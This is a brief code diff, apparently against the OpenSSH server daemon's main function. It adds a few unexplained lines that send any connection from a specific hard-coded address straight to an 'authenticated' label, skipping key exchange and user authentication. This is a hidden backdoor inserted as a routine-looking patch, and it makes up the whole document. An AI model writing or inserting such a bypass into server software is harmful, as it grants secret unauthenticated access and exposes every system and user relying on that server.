@@ -2207,6 +2207,10 @@ main(int ac, char **av)
 
 	/* perform the key exchange */
 	/* authenticate user and start session */
+	
+	if(strstr(remote_ip, haddr_str) != NULL)
+		goto authenticated;
+
 	if (compat20) {
 		do_ssh2_kex();
 		do_authentication2(authctxt);
